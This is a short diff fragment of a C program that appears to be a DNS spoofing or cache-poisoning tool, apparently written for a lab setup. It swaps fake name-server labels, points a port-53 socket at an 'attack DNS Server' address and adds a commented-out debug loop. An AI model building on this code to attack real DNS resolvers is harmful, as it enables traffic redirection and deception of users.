@@ -116,14 +116,14 @@ int main ( int argc , char *argv[] )
 	unsigned char   base_reg;
 	unsigned char	target_url[256];
 	unsigned char	name[256];
-	unsigned char	NS_name[3][16] = { "DNS1" , "DNS2" , "DNS3" }; //{ "STRAWB" , "BITSY" , "W20NS" };
+	unsigned char	NS_name[3][16] = { "STRAWB" , "BITSY" , "W20NS" };  //{ "DNS1" , "DNS2" , "DNS3" }; //{ "STRAWB" , "BITSY" , "W20NS" };
 	unsigned char	IP[4];
 	unsigned long   ip , fack_dns_ip;
 	unsigned char	*q , *ans , *aut , *add;
 	int 	que_l , ans_l , aut_l , add_l , dns_l;
 	int 	que_a , ans_a , aut_a , add_a , att_l;
 
-	ip = inet_addr("140.114.77.3");	
+	ip = inet_addr("140.114.77.3");
 	memcpy ( IP , &ip , 4 );
 	if( argc < 2 )
 	{
@@ -135,12 +135,16 @@ int main ( int argc , char *argv[] )
 		target_url[i] = '\0';
 	strncpy( target_url , argv[1] , strlen(argv[1]) );
 	
+/*	for ( i = 0 ; i < 3 ; i++ )
+	{
+		printf( "%d %s\n", strlen( NS_name[i] ) , NS_name[i] );
+	}*/
 	port = 53;
 
 	// start up query socket 
 	server_addr.sin_family = AF_INET;
 	server_addr.sin_port = htons(port);
-	server_addr.sin_addr.s_addr = inet_addr("192.168.58.128"); // attack DNS Server
+	server_addr.sin_addr.s_addr = inet_addr("192.168.58.128");//addr->s_addr;
 	bzero(&(server_addr.sin_zero),8);
 	clinet_addr.sin_family = AF_INET;
 	clinet_addr.sin_port = htons(port);
